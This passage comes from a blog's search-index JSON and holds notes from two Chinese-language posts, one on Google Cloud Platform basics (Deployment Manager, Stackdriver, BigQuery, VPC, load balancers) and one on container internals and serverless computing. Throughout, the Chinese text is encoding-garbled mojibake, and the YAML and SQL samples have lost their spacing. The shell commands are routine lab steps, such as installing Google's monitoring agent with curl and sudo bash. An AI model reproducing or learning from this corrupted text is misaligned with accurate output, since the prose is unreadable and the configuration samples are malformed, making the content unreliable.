","date":"2021-09-23","objectID":"/gcp/:9:1","tags":["GCP","ç½‘ç»œ","è®¤è¯"],"title":"é«˜æ•æ— å¿§ï¼šGoogle Cloud Platform åŸºç¡€","uri":"/gcp/"},{"categories":["äº‘"],"content":"äº‘ä¸Šéƒ¨ç½² Deployment Manager æä¾›äº†å£°æ˜å¼çš„æ–¹å¼æ¥è®¾å®šéƒ¨ç½²ç¯å¢ƒï¼Œæœ‰ç‚¹åƒ Kubernetes deploymentï¼Œä¹Ÿå¯ä»¥æŠŠè®¾å®šæ–‡ä»¶æ”¾åœ¨ Cloud Source Repositories é‡Œ ","date":"2021-09-23","objectID":"/gcp/:9:2","tags":["GCP","ç½‘ç»œ","è®¤è¯"],"title":"é«˜æ•æ— å¿§ï¼šGoogle Cloud Platform åŸºç¡€","uri":"/gcp/"},{"categories":["äº‘"],"content":"äº‘ä¸Šç›‘æ§ Stackdriver ç”¨äºç›‘æ§äº‘ä¸Šèµ„æºï¼Œæ²¡æœ‰å‘ç°ä»€ä¹ˆæœ‰ç‰¹è‰²çš„åœ°æ–¹ï¼Ÿ ","date":"2021-09-23","objectID":"/gcp/:9:3","tags":["GCP","ç½‘ç»œ","è®¤è¯"],"title":"é«˜æ•æ— å¿§ï¼šGoogle Cloud Platform åŸºç¡€","uri":"/gcp/"},{"categories":["äº‘"],"content":"äº‘ä¸Šéƒ¨ç½²ä¸ç›‘æ§å®è·µ å‡†å¤‡ç¯å¢ƒï¼Œä¸‹è½½ Deployment Manager çš„æ¨¡ç‰ˆï¼š export MY_ZONE=us-central1-a gsutil cp gs://cloud-training/gcpfcoreinfra/mydeploy.yaml mydeploy.yaml æ›¿æ¢æ¨¡ç‰ˆä¸­çš„å­—æ®µï¼š sed -i -e \"s/PROJECT_ID/$DEVSHELL_PROJECT_ID/\" mydeploy.yaml sed -i -e \"s/ZONE/$MY_ZONE/\" mydeploy.yaml æœ€ç»ˆæ¨¡ç‰ˆå¤§çº¦æ˜¯è¿™æ ·çš„ï¼š resources:- name:my-vmtype:compute.v1.instanceproperties:zone:us-central1-amachineType:zones/us-central1-a/machineTypes/n1-standard-1metadata:items:- key:startup-scriptvalue:\"apt-get update\"disks:- deviceName:boottype:PERSISTENTboot:trueautoDelete:trueinitializeParams:sourceImage:https://www.googleapis.com/compute/v1/projects/debian-cloud/global/images/debian-9-stretch-v20180806networkInterfaces:- network:https://www.googleapis.com/compute/v1/projects/qwiklabs-gcp-dcdf854d278b50cd/global/networks/defaultaccessConfigs:- name:External NATtype:ONE_TO_ONE_NAT éƒ¨ç½²ï¼š gcloud deployment-manager deployments create my-first-depl --config mydeploy.yaml æŸ¥çœ‹å·²éƒ¨ç½²çš„ Compute Engineã€‚ ç¼–è¾‘æ¨¡ç‰ˆä¸­çš„ startup scriptï¼Œæ›´æ–°ä¸ºï¼š value:\"apt-get update; apt-get install nginx-light -y\" æ‰§è¡Œæ›´æ–°ï¼š gcloud deployment-manager deployments update my-first-depl --config mydeploy.yaml æ£€æŸ¥ Compute Engine ä¸­æ–°çš„ startup scriptã€‚ åœæ­¢è™šæ‹Ÿæœºï¼Œè®¾ç½® Service account ä¸º Compute Engine default service account å¹¶ Allow full access to all Cloud APIsã€‚å¯åŠ¨è™šæ‹Ÿæœºã€‚ SSH åˆ°è™šæ‹Ÿæœºï¼Œè¿è¡Œå¦‚ä¸‹å‘½ä»¤å¢åŠ  CPU è´Ÿè½½ï¼š dd if=/dev/urandom | gzip -9 \u003e\u003e /dev/null \u0026 æ§åˆ¶å°ä¸­ä¸º Project å¼€å¯ Monitoring Workspaceï¼ˆè‡ªåŠ¨ï¼‰ï¼Œéšååœ¨è™šæ‹Ÿæœºä¸­å®‰è£… agentï¼š curl -sSO https://dl.google.com/cloudagents/install-monitoring-agent.sh sudo bash install-monitoring-agent.sh curl -sSO https://dl.google.com/cloudagents/install-logging-agent.sh sudo bash install-logging-agent.sh æ§åˆ¶å° Monitoring é¢æ¿ä¸­ç‚¹å‡» Metrics Explorer -\u003e Metricï¼Œé€‰æ‹©è™šæ‹Ÿæœºèµ„æºå’Œ CPU ä½¿ç”¨æƒ…å†µå¹¶æŸ¥çœ‹å›¾è¡¨ã€‚ è¿è¡Œ kill %1 åœæ­¢å ç”¨ CPUï¼Œå†æ¬¡æŸ¥çœ‹å›¾è¡¨ã€‚ ","date":"2021-09-23","objectID":"/gcp/:9:4","tags":["GCP","ç½‘ç»œ","è®¤è¯"],"title":"é«˜æ•æ— å¿§ï¼šGoogle Cloud Platform åŸºç¡€","uri":"/gcp/"},{"categories":["äº‘"],"content":"äº‘ä¸Šæ•°æ®å¤„ç† Cloud Dataprocï¼Œç”¨äºåœ¨ GCP ä¸Šè¿è¡Œ Hadoopã€Sparkã€Hiveã€Pig ç­‰æ•°æ®é›†ç¾¤ Cloud Dataflowï¼Œç”¨äºæ„å»ºæ•°æ®æµæ°´çº¿ï¼Œæä¾›äº†èµ„æºè‡ªåŠ¨ä¼¸ç¼©çš„åŠŸèƒ½ï¼Œç›¸æ¯” Cloud Dataproc æ›´çµæ´» BigQueryï¼Œé¡¾åæ€ä¹‰ï¼Œæä¾›é’ˆå¯¹å¤§é‡æ•°æ®æä¾›é«˜é€Ÿ SQL æŸ¥è¯¢æœåŠ¡ Cloud Pub/Subï¼Œæä¾›å¯é çš„ã€å¤šå¯¹å¤šçš„å¼‚æ­¥æ¶ˆæ¯æ¨é€ / æ‹‰å–æœåŠ¡ Cloud Datalabï¼Œä¹Ÿå°±æ˜¯ GCP ä¸­çš„ Jupyter Notebookï¼Œåº•å±‚åŸºç¡€è®¾æ–½ä½¿ç”¨çš„æ˜¯ BigQueryã€Compute Engine å’Œ Cloud Storage Cloud MLï¼Œä¹Ÿå°±æ˜¯åœ¨ GCP ä¸Šè¿è¡Œ TensorFlowï¼Œå¥½å¤„æ˜¯å¯ä»¥åˆ©ç”¨ GCP ä¸Šçš„é«˜æ€§èƒ½è®¡ç®—èµ„æº ","date":"2021-09-23","objectID":"/gcp/:10:0","tags":["GCP","ç½‘ç»œ","è®¤è¯"],"title":"é«˜æ•æ— å¿§ï¼šGoogle Cloud Platform åŸºç¡€","uri":"/gcp/"},{"categories":["äº‘"],"content":"BigQuery å®è·µ åœ¨ BigQuery ä¸­æ–°å»ºæ•°æ®é›† logdataï¼Œéšååˆ›å»ºè¡¨ accesslogï¼Œæ•°æ®æºæ¥è‡ª Cloud Storageï¼ŒURL ä¸º gs://cloud-training/gcpfci/access_log.csvã€‚ åˆ›å»ºå®Œæˆåï¼Œåœ¨è¡¨è¯¦æƒ…é¡µé¢å¯ä»¥ Preview ä¸€äº›æ•°æ®ã€‚ åœ¨æ§åˆ¶å°è¿è¡Œ queryï¼š selectint64_field_6ashour,count(*)ashitcountfromlogdata.accessloggroupbyhourorderbyhour ç±»ä¼¼ä¸Šä¸€æ­¥çš„æŸ¥è¯¢ä¹Ÿå¯ä»¥ç”¨ bq å‘½ä»¤è¡Œå·¥å…·å®Œæˆï¼š bq query \"select string_field_10 as request, count(*) as requestcount from logdata.accesslog group by request order by requestcount desc\" ","date":"2021-09-23","objectID":"/gcp/:10:1","tags":["GCP","ç½‘ç»œ","è®¤è¯"],"title":"é«˜æ•æ— å¿§ï¼šGoogle Cloud Platform åŸºç¡€","uri":"/gcp/"},{"categories":["äº‘"],"content":"Network å’Œ Subnetwork Network æ˜¯è·¨ Region çš„ï¼Œæ‹¥æœ‰è‡ªå·±çš„ DNSã€‚å¤„äºåŒä¸€ Network çš„è™šæ‹Ÿæœºä¹‹é—´ï¼Œå³ä½¿å¤„äºä¸åŒ Regionï¼Œä¹Ÿå¯ä»¥é€šè¿‡å†…ç½‘ IP äº’ç›¸é€šä¿¡ã€‚åŒç†ï¼ŒåŒä¸€ Region ä¸­çš„è™šæ‹Ÿæœºï¼Œå¦‚æœä¸å¤„äºåŒä¸€ Networkï¼Œå°±æ— æ³•é€šè¿‡å†…ç½‘ IP é€šä¿¡ã€‚ åŒç†ï¼ŒSubnetwork æ˜¯è·¨ Zone çš„ã€‚å¤„äºåŒä¸€ Subnetwork çš„è™šæ‹Ÿæœºä¹‹é—´ï¼Œå³ä½¿å¤„äºä¸åŒ Zoneï¼Œä¹Ÿå¯ä»¥é€šè¿‡å†…ç½‘ IP é€šä¿¡ã€‚Subnetwork å®é™…ä¸Šå°±æ˜¯é€šå¸¸æ„ä¹‰ä¸‹çš„å­ç½‘ï¼Œä¹Ÿå°±æ˜¯ RFC 1918ã€‚Subnetwork åªèƒ½æ‰©å±•ä¸èƒ½ç¼©å°ã€‚ ","date":"2021-09-23","objectID":"/gcp/:11:0","tags":["GCP","ç½‘ç»œ","è®¤è¯"],"title":"é«˜æ•æ— å¿§ï¼šGoogle Cloud Platform åŸºç¡€","uri":"/gcp/"},{"categories":["äº‘"],"content":"DNS Network å†…éƒ¨çš„ DNS æ˜¯ä¸ºäº†ç¡®ä¿è™šæ‹Ÿæœºå†…éƒ¨ IP å˜åŒ–æ—¶ï¼Œå¯¹è™šæ‹Ÿæœºçš„è®¿é—®ä¸å—å½±å“ã€‚è¿™ä¸€ç‚¹å’Œ K8s å¦‚å‡ºä¸€è¾™ã€‚è‡³äº IP åœ°å€ã€è·¯ç”±ï¼Œä¹Ÿå’Œé€šå¸¸æ„ä¹‰ä¸‹çš„å·®ä¸å¤šã€‚ ","date":"2021-09-23","objectID":"/gcp/:11:1","tags":["GCP","ç½‘ç»œ","è®¤è¯"],"title":"é«˜æ•æ— å¿§ï¼šGoogle Cloud Platform åŸºç¡€","uri":"/gcp/"},{"categories":["äº‘"],"content":"é˜²ç«å¢™ æ¯ä¸ª VPC å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼é˜²ç«å¢™ï¼Œåªä¸è¿‡å‡ºå…¥æ§åˆ¶æ˜¯è™šæ‹Ÿæœºçº§çš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸ä»…æ•´ä¸ªç½‘ç»œå—åˆ°é˜²ç«å¢™ä¿æŠ¤ï¼Œæ¯ä¸ªè™šæ‹Ÿæœºä¹Ÿæ˜¯å¦‚æ­¤ã€‚è¿™ä½¿å¾—é˜²ç«å¢™è§„åˆ™ä¹Ÿå¯ä»¥é’ˆå¯¹æ¯ä¸ªè™šæ‹Ÿæœºè¿›è¡Œä¸åŒè®¾ç½®ã€‚ æœ€åï¼Œä¿åº•è§„åˆ™æ˜¯æ‹’ç»å…¨éƒ¨ Ingress è¯·æ±‚ï¼Œå…è®¸å…¨éƒ¨ Egress è¯·æ±‚ã€‚é˜²ç«å¢™è§„åˆ™ä¹Ÿéµå¾ªä¸Šæ–‡æåˆ°çš„èµ„æºå±‚çº§æ ‘å±‚å±‚ç»§æ‰¿ã€‚ ","date":"2021-09-23","objectID":"/gcp/:11:2","tags":["GCP","ç½‘ç»œ","è®¤è¯"],"title":"é«˜æ•æ— å¿§ï¼šGoogle Cloud Platform åŸºç¡€","uri":"/gcp/"},{"categories":["äº‘"],"content":"å¤šç½‘å¡ æ¯ä¸ªè™šæ‹Ÿæœºåœ¨åˆ›å»ºæ—¶å¯ä»¥æŒ‡å®šå¤šä¸ªç½‘å¡ï¼Œä»è€Œæ¥å…¥å¤šä¸ªä¸åŒçš„ Networkã€‚ä¸è¿‡ï¼ŒNetwork å†…éƒ¨çš„ DNS åªèƒ½è§£æåˆ° nic0 ä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ªç½‘å¡ï¼Œå¦‚æœ nic0 å¹¶ä¸å¯¹åº”è¯¥ Networkï¼ŒDNS è§£æä¼šå¤±æ•ˆã€‚ ","date":"2021-09-23","objectID":"/gcp/:11:3","tags":["GCP","ç½‘ç»œ","è®¤è¯"],"title":"é«˜æ•æ— å¿§ï¼šGoogle Cloud Platform åŸºç¡€","uri":"/gcp/"},{"categories":["äº‘"],"content":"å¤šç½‘ç»œ Shared VPC å¯ä»¥è¿æ¥å¤šä¸ªä¸åŒ Project çš„è®¡ç®—èµ„æºï¼Œä½¿å¾—è®¡ç®—èµ„æºä¹‹é—´å¯ä»¥é€šè¿‡å†…ç½‘ IP é€šä¿¡ã€‚ç±»ä¼¼åœ°ï¼ŒVPC Network Peering å¯ä»¥è·¨ Organiztion è¿æ¥è®¡ç®—èµ„æºï¼Œå®ç°ç‚¹å¯¹ç‚¹çš„è¿æ¥ã€‚ä¸¤è€…æœ€å¤§çš„åŒºåˆ«åœ¨äºï¼Œç½‘ç»œç®¡ç†æ˜¯å¦æ˜¯ä¸­å¿ƒåŒ–çš„ã€‚ Shared VPC VPC Network Peering è·¨ Organization â âœ… è¿æ¥åŒä¸€ Project å†…çš„èµ„æº â âœ… ç½‘ç»œç®¡ç†æ¨¡å¼ ä¸­å¿ƒåŒ– å»ä¸­å¿ƒåŒ– ","date":"2021-09-23","objectID":"/gcp/:11:4","tags":["GCP","ç½‘ç»œ","è®¤è¯"],"title":"é«˜æ•æ— å¿§ï¼šGoogle Cloud Platform åŸºç¡€","uri":"/gcp/"},{"categories":["äº‘"],"content":"è´Ÿè½½å‡è¡¡ è´Ÿè½½å‡è¡¡æ˜¯åŸºäºè™šæ‹Ÿæœºå®ä¾‹ç»„çš„ï¼Œç±»ä¼¼äº K8s é‡Œçš„ä¸€ä¸ª ReplicaSetï¼Œç”šè‡³ä¹ŸåŒ…å«äº†è‡ªåŠ¨ä¼¸ç¼©ã€æ»šåŠ¨æ›´æ–°ã€å¥åº·æ£€æŸ¥ç­‰åŠŸèƒ½ã€‚ä¸€ä¸ªè™šæ‹Ÿæœºå®ä¾‹ç»„ä¸€èˆ¬åœ¨åŒä¸€ Region å†…ã€‚ HTTP(S) è´Ÿè½½å‡è¡¡å™¨å°†ç”¨æˆ·è¯·æ±‚å‘é€è‡³ HTTP(S) ä»£ç†ï¼Œéšåè½¬å‘ç»™ backend serviceï¼Œæœ€ç»ˆå‘é€åˆ°ä¸åŒ Region çš„å®ä¾‹ç»„ã€‚å¯¹äºé HTTP è¯·æ±‚ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ TCP å’Œ SSL è´Ÿè½½å‡è¡¡å™¨ã€‚å¦‚æœéœ€è¦å‘é€ UDP è¯·æ±‚æˆ–è€… TCP å’Œ SSL è´Ÿè½½å‡è¡¡å™¨ä¸æ”¯æŒçš„è¯·æ±‚ï¼Œåˆ™å¯ä»¥ä½¿ç”¨é€‚ç”¨èŒƒå›´æ›´å¹¿çš„ Network è´Ÿè½½å‡è¡¡å™¨ã€‚æœ€åï¼Œå¦‚æœæœåŠ¡ä¸éœ€è¦å¯¹å…¬ç½‘å¼€æ”¾ï¼Œåˆ™å¯ä»¥ä½¿ç”¨åŒæ ·æ”¯æŒ TCP / UDP è¯·æ±‚ï¼Œä½†é€Ÿåº¦æ›´å¿«ã€é…ç½®æ›´ç®€å•çš„å†…ç½‘è´Ÿè½½å‡è¡¡å™¨ï¼ˆåŸºäº Andromedaï¼‰ã€‚ å¯ä»¥é€šè¿‡å¦‚ä¸‹æµç¨‹å›¾æ¥é€‰æ‹©åˆé€‚çš„è´Ÿè½½å‡è¡¡å™¨ï¼š å›¾ 6ï½œé€‰æ‹©åˆé€‚çš„è´Ÿè½½å‡è¡¡å™¨ \" å›¾ 6ï½œé€‰æ‹©åˆé€‚çš„è´Ÿè½½å‡è¡¡å™¨ ","date":"2021-09-23","objectID":"/gcp/:12:0","tags":["GCP","ç½‘ç»œ","è®¤è¯"],"title":"é«˜æ•æ— å¿§ï¼šGoogle Cloud Platform åŸºç¡€","uri":"/gcp/"},{"categories":["äº‘"],"content":"ç²¾å¯†è€Œå¤æ‚ã€‚ ","date":"2021-09-10","objectID":"/cloud-native/:0:0","tags":["Docker","Kubernetes","ARM"],"title":"é£è°²äº‘è¯¡ï¼šäº‘åŸç”ŸæŠ€æœ¯åŸç†","uri":"/cloud-native/"},{"categories":["äº‘"],"content":"å®¹å™¨ ","date":"2021-09-10","objectID":"/cloud-native/:1:0","tags":["Docker","Kubernetes","ARM"],"title":"é£è°²äº‘è¯¡ï¼šäº‘åŸç”ŸæŠ€æœ¯åŸç†","uri":"/cloud-native/"},{"categories":["äº‘"],"content":"Namespace Linux é‡‡ç”¨ Namespace æŠ€æœ¯è¿›è¡Œèµ„æºéš”ç¦»ï¼Œå¯ä»¥ä¸ºä¸åŒè¿›ç¨‹åˆ†é…ä¸åŒçš„ Namespaceï¼Œæœ‰ç‚¹ç±»ä¼¼æ²™ç®±çš„æ¦‚å¿µã€‚åœ¨ Linux è¿›ç¨‹çš„æ•°æ®ç»“æ„ä¸­ï¼Œnsproxy ç»“æ„ä½“è´Ÿè´£ç®¡ç† Namespaceï¼š struct nsproxy { atomic_t count; struct uts_namespace *uts_ns; struct ipc_namespace *ipc_ns; struct mnt_namespace *mnt_ns; struct pid_namespace *pid_ns_for_children; struct net *net_ns; } é»˜è®¤æƒ…å†µä¸‹çˆ¶å­è¿›ç¨‹å…±äº« Namespaceï¼Œä½†ä¹Ÿå¯ä»¥é€šè¿‡è°ƒç”¨ cloneã€setnsã€unshare ç­‰æ–¹æ³•æ‰‹åŠ¨æŒ‡å®šå’Œä¿®æ”¹ Namespaceã€‚ ä»¥ä¸Šé¢ç»“æ„ä½“çš„ pid_namespace ä¸ºä¾‹ï¼Œä¸¤ä¸ªä¸åŒçš„ PID Namespace ä¸‹çš„è¿›ç¨‹ä¹‹é—´æ˜¯äº’ä¸å½±å“çš„ã€‚ç±»ä¼¼çš„ï¼Œç½‘ç»œã€æ–‡ä»¶ç³»ç»Ÿã€ç”¨æˆ·ã€æŒ‚è½½ç‚¹ç­‰çš„ Namespace ä¹‹é—´ä¹ŸåŒç†ã€‚ å¯ä»¥çœ‹åˆ°ï¼ŒDocker å®é™…ä¸Šå°±æ˜¯å¯¹ Namespace çš„ä¸€æ¬¡å°è£…ï¼Œå› æ­¤åœ¨å®¿ä¸»æœºä¸Šè°ƒè¯• Docker å†…éƒ¨ç¨‹åºæ—¶ï¼Œä¹Ÿå¯ä»¥å€ŸåŠ© Namespace çš„å‘½ä»¤è¡Œå·¥å…·ã€‚å…ˆè·å–å¯¹åº”å®¹å™¨çš„ PIDï¼š $ docker inspect [docker id] | grep pid å†ç”¨ nsenter è¿›å…¥å¯¹åº”çš„ Namespaceï¼Œä¾‹å¦‚è¿›å…¥ç½‘ç»œ Namespace ä½¿ç”¨ -nï¼š $ nsenter -t [pid] -n [cmd] ","date":"2021-09-10","objectID":"/cloud-native/:1:1","tags":["Docker","Kubernetes","ARM"],"title":"é£è°²äº‘è¯¡ï¼šäº‘åŸç”ŸæŠ€æœ¯åŸç†","uri":"/cloud-native/"},{"categories":["äº‘"],"content":"Cgroups Cgroups å¯¹è¿›ç¨‹ä½¿ç”¨çš„è®¡ç®—èµ„æºè¿›è¡Œç®¡æ§ï¼Œå¯¹ä¸åŒç±»å‹çš„èµ„æºé‡‡ç”¨ä¸åŒå­ç³»ç»Ÿï¼Œå¹¶åœ¨å­ç³»ç»Ÿä¸­é‡‡ç”¨å±‚çº§æ ‘ç»“æ„ï¼ˆ/sys/fs/cgroupï¼‰ã€‚ ğŸŒ° é™åˆ¶è¿›ç¨‹ä½¿ç”¨çš„ CPU èµ„æº é¦–å…ˆè¿›å…¥ cpu å­ç³»ç»Ÿï¼Œå°†è¿›ç¨‹åŠ å…¥ cgroupï¼š $ cd /sys/fs/cgroup/cpu $ echo [pid] \u003e cgroup.procs éšåå…³æ³¨ cpu.cfs_quota_us å’Œ cpu.cfs_period_usï¼Œä¸¤è€…çš„æ¯”å€¼å³è¿›ç¨‹èƒ½å ç”¨ CPU èµ„æºçš„æœ€é«˜æ¯”ä¾‹ï¼Œé»˜è®¤å€¼ä¸º -1ï¼ˆæ— é™åˆ¶ï¼‰ å’Œ 100000ã€‚ ä¾‹å¦‚ï¼Œè®¾ç½®æœ€å¤šå ç”¨ 25% CPU èµ„æºï¼š $ echo 25000 \u003e cpu.cfs_quota_us ","date":"2021-09-10","objectID":"/cloud-native/:1:2","tags":["Docker","Kubernetes","ARM"],"title":"é£è°²äº‘è¯¡ï¼šäº‘åŸç”ŸæŠ€æœ¯åŸç†","uri":"/cloud-native/"},{"categories":["äº‘"],"content":"UnionFS é¡¾åæ€ä¹‰ï¼ŒUnionFS å¯ä»¥å¯¹æ–‡ä»¶ç³»ç»Ÿ â€œå–å¹¶é›†â€ï¼Œä¹Ÿå°±æ˜¯å°†ä¸åŒç›®å½•æŒ‚è½½åˆ°åŒä¸€ä¸ªè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿä¸‹ã€‚ ç»å…¸çš„ Linux ç³»ç»Ÿä¸­ï¼Œä½¿ç”¨ bootfs ä¸­çš„ BootLoader å¼•å¯¼åŠ è½½ Kernel åˆ°å†…å­˜ä¸­ï¼Œç„¶å umount æ‰ bootfsã€‚Kernel åŠ è½½å®Œæˆåï¼Œå°±ä¼šä½¿ç”¨æˆ‘ä»¬ç†Ÿæ‚‰çš„ rootfs æ–‡ä»¶ç³»ç»Ÿã€‚å¯åŠ¨æ—¶å…ˆå°† rootfs è®¾ä¸º readonly è¿›è¡Œæ£€æŸ¥ï¼Œéšåå†è®¾ä¸º readwrite ä¾›ä½¿ç”¨ã€‚ è€Œåœ¨ Docker å¯åŠ¨æ—¶ï¼Œæ£€æŸ¥å®Œ readonly çš„ rootfs åä¼šå† union mount ä¸€ä¸ª readwrite çš„æ–‡ä»¶ç³»ç»Ÿï¼Œç§°ä¸ºä¸€ä¸ª FS å±‚ã€‚åç»­ä¼šç»§ç»­æ·»åŠ  readwrite çš„ FS å±‚ï¼Œæ¯æ¬¡æ·»åŠ æ—¶å°†å½“å‰æœ€é¡¶å±‚çš„ FS å±‚è®¾ä¸º readonlyã€‚è¿™å®é™…ä¸Šå°±æ˜¯ docker build æ ¹æ® Dockerfile ä¸­æ¯ä¸€è¡Œçš„æŒ‡ä»¤å †å  FS å±‚çš„è¿‡ç¨‹ã€‚ é‚£ä¹ˆå¦‚æœè¦ä¿®æ”¹ä¸‹å±‚ readonly FS å±‚çš„æ–‡ä»¶æ€ä¹ˆåŠå‘¢ï¼Ÿåªéœ€è¦ Copy-on-Writeï¼Œå°†æ–‡ä»¶å¤åˆ¶åˆ°å¯å†™çš„é¡¶å±‚å¹¶ä¿®æ”¹å³å¯ã€‚è¿™æ ·èƒ½æˆåŠŸæ˜¯å› ä¸º Docker é‡‡ç”¨çš„ OverlayFS åœ¨åˆå¹¶ä¸Šä¸‹å±‚åŒåæ–‡ä»¶æ—¶ï¼Œä¼˜å…ˆé€‰æ‹©ä¸Šå±‚æ–‡ä»¶ã€‚ æœ€åï¼ŒFS å±‚å¯ä»¥åœ¨ä¸åŒé•œåƒä¹‹é—´å¤ç”¨ï¼ŒèŠ‚çœé•œåƒæ„å»ºæ—¶é—´å’Œç¡¬ç›˜å ç”¨ã€‚ ","date":"2021-09-10","objectID":"/cloud-native/:1:3","tags":["Docker","Kubernetes","ARM"],"title":"é£è°²äº‘è¯¡ï¼šäº‘åŸç”ŸæŠ€æœ¯åŸç†","uri":"/cloud-native/"},{"categories":["äº‘"],"content":"Serverless ","date":"2021-09-10","objectID":"/cloud-native/:2:0","tags":["Docker","Kubernetes","ARM"],"title":"é£è°²äº‘è¯¡ï¼šäº‘åŸç”ŸæŠ€æœ¯åŸç†","uri":"/cloud-native/"},{"categories":["äº‘"],"content":"FaaS Serverless å¹¶ä¸æ˜¯æŒ‡ä¸éœ€è¦æœåŠ¡å™¨ï¼Œè€Œæ˜¯æŒ‡å¯¹æœåŠ¡å™¨è¿ç»´çš„æç«¯æŠ½è±¡ã€‚æˆ‘ä»¬çŸ¥é“ï¼Œåœ¨ç¨‹åºè®¾è®¡é¢†åŸŸå‘ç”Ÿçš„æŠ½è±¡ï¼Œéƒ½æ˜¯ä¸ºäº†é™ä½å¼€å‘éš¾åº¦å’Œæˆæœ¬ã€è®©å¼€å‘è€…æ›´ä¸“æ³¨äºçœŸæ­£æœ‰ä»·å€¼çš„å·¥ä½œã€‚å› æ­¤ï¼ŒServerless ä¸»è¦æ˜¯é’ˆå¯¹åç«¯è¿ç»´è¿›è¡Œçš„ä¸€ç§ä¼˜åŒ–ã€‚ Serverless é¦–å…ˆæå‡ºçš„æ¦‚å¿µæ˜¯å‡½æ•°å³æœåŠ¡ FaaSï¼Œå¤§ä½“å¯ä»¥åˆ†æˆå‡½æ•°ä»£ç ã€å‡½æ•°æœåŠ¡ã€è§¦å‘å™¨ä¸‰ä¸ªéƒ¨åˆ†ã€‚ è§¦å‘å™¨æ¥æ”¶ç”¨æˆ·è¯·æ±‚å¹¶é€šçŸ¥å‡½æ•°æœåŠ¡ã€‚å®é™…ä¸Šæ˜¯å¯¹è´Ÿè½½å‡è¡¡ã€åå‘ä»£ç†ç­‰ä¸­é—´ä»¶å·¥ä½œçš„æŠ½è±¡ å‡½æ•°æœåŠ¡æ”¶åˆ°æ¶ˆæ¯åï¼Œæ£€æŸ¥æ˜¯å¦æœ‰å¯ç”¨çš„å‡½æ•°å®ä¾‹ï¼Œæ²¡æœ‰åˆ™é€šè¿‡å‡½æ•°ä»£ç æ¥åˆå§‹åŒ–ä¸€ä¸ªæ–°çš„å‡½æ•°å®ä¾‹ï¼›æœ€åå°†ç”¨æˆ·è¯·æ±‚ä½œä¸ºå‡½æ•°å‚æ•°ï¼Œæ‰§è¡Œå‡½æ•°ï¼Œè¿”å›çš„ç»“æœå°†åŸè·¯è¿”å›ã€‚å®é™…ä¸Šæ˜¯å¯¹ä»£ç è¿è¡Œç¯å¢ƒçš„æŠ½è±¡ å‡½æ•°ä»£ç ä¸€èˆ¬åœ¨ git ä¹‹ç±»çš„ç‰ˆæœ¬æ§åˆ¶ä»“åº“ã€‚å®é™…ä¸Šæ˜¯å¯¹ä»£ç ä¸Šä¼ å’Œéƒ¨ç½²çš„æŠ½è±¡ å¼¹æ€§ä¼¸ç¼© å€¼å¾—ä¸€æçš„æ˜¯ï¼ŒFaaS èƒ½æ ¹æ®ç›®å‰è´Ÿè½½å¯¹å ç”¨èµ„æºè¿›è¡Œå¼¹æ€§ä¼¸ç¼©ï¼Œæ— è´Ÿè½½æ—¶ç”šè‡³å¯ä»¥ä¸å ç”¨èµ„æºã€‚è¿™èƒ½å¤Ÿå¾ˆå¤§ç¨‹åº¦ä¸Šæå‡èµ„æºåˆ©ç”¨ç‡ã€‚ å†·å¯åŠ¨ å†·å¯åŠ¨å’Œçƒ­å¯åŠ¨ç›¸åï¼Œä»ä¸€ä¸ªæœªåˆå§‹åŒ–çš„æœåŠ¡å¼€å§‹ï¼Œç›´åˆ°å‡½æ•°å®ä¾‹æ‰§è¡Œå®Œæ¯•ç»“æŸã€‚ç”±äºå¯èƒ½æ¶‰åŠæ¯”è¾ƒç¹ççš„åˆå§‹åŒ–å·¥ä½œï¼Œä¼ ç»ŸæœåŠ¡ä¹Ÿè®¸èƒ½å¤Ÿåœ¨çƒ­å¯åŠ¨ä¸Šè¾¾åˆ°å¾ˆå¿«çš„é€Ÿåº¦ï¼Œä½†åœ¨å†·å¯åŠ¨ä¸Šä¸è¡Œã€‚ FaaS åˆ™é€šè¿‡å®¹å™¨ã€è¿è¡Œç¯å¢ƒã€ä»£ç ä¸‰è€…åˆ†å±‚å¹¶åˆ†åˆ«ç¼“å­˜ï¼Œè·å¾—äº†è¾ƒå¿«çš„å†·å¯åŠ¨é€Ÿåº¦ï¼Œä¸€èˆ¬å¤§çº¦åœ¨å‡ ç™¾æ¯«ç§’å†…ã€‚æ˜¾ç„¶ï¼Œè¿™æ˜¯ç‰ºç‰²äº†ç”¨æˆ·å¯¹åº•å±‚ç¯å¢ƒçš„å¯æ§æ€§æ¢æ¥çš„ã€‚ è¯­è¨€æ— å…³æ€§ FaaS å¯ä»¥æ›¿æ¢ä¼ ç»Ÿå‰åç«¯åˆ†ç¦»å¼€å‘ä¸­çš„åç«¯æœåŠ¡ã€å¯ä»¥ç”¨æ¥è¯·æ±‚å…¬å¼€çš„ Web APIã€æ›´é‡è¦çš„æ˜¯å¯ä»¥å’Œå…¶ä»–äº‘æœåŠ¡å•†æä¾›çš„æœåŠ¡è¿›è¡Œè”åŠ¨ã€‚ç”±äºå‰ç«¯åªåœ¨æ„æœ€åè¿”å›çš„æ•°æ®ï¼Œæˆ‘ä»¬çš„å‡½æ•°æœåŠ¡å®Œå…¨å¯ä»¥æ··åˆé‡‡ç”¨å¤šç§ä¸åŒçš„è¯­è¨€æ¥ç¼–å†™ï¼Œä»¥é€‚åº”ä¸åŒçš„éœ€æ±‚ã€‚ æ•°æ®åº“ï¼Ÿ FaaS ä¸­çš„å‡½æ•°å®ä¾‹éƒ½æ´»ä¸äº†å¤ªä¹…ï¼Œæœ‰çš„æ‰§è¡Œå®Œå°±è¢«é”€æ¯äº†ï¼Œè€Œæœ‰çš„å¯èƒ½èƒ½åœ¨å†…å­˜ä¸­å¤šå¾…ä¸€ä¼šå„¿ï¼Œä½†äº‘æœåŠ¡å•†ç»è¿‡ä¸€å°æ®µæ—¶é—´åä»ä¼šé”€æ¯å®ƒä»¬ï¼Œè¿™æ˜¯å› ä¸º FaaS éœ€è¦å¼¹æ€§ä¼¸ç¼©ï¼Œå®ƒçš„æ ¸å¿ƒæ˜¯æ— çŠ¶æ€çš„å‡½æ•°ï¼ˆå°±åƒ HTTP åè®®æ˜¯æ— çŠ¶æ€çš„ä¸€æ ·ï¼‰ã€‚ è¿™å°±ç»™æ•°æ®æŒä¹…åŒ–å¸¦æ¥äº†é—®é¢˜ï¼Œæ¯”å¦‚æ•°æ®åº“å°±ä¸èƒ½æ”¾åœ¨ FaaS 